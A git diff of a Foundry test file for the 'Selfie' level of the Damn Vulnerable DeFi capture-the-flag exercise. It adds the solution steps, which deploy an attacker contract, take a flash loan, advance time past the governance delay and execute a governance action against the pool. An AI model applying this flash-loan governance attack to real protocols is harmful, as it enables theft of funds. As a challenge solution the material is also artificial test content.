@@ -7,6 +7,7 @@ import "forge-std/Test.sol";
 import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
 import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";
+import {AttackerContract} from "../../../src/Contracts/selfie/AttackerContract.sol";
 
 contract Selfie is Test {
     uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
@@ -47,7 +48,16 @@ contract Selfie is Test {
         /**
          * EXPLOIT START *
          */
-
+        AttackerContract attackerContract = new AttackerContract(
+            address(selfiePool),
+            address(simpleGovernance),
+            address(dvtSnapshot),
+            attacker
+         );
+        attackerContract.exploitFlashLoan();
+        // EXPLAIN - Move time to pass delay
+        vm.warp(block.timestamp + 4 days);
+        attackerContract.executeGovernance();
         /**
          * EXPLOIT END *
          */
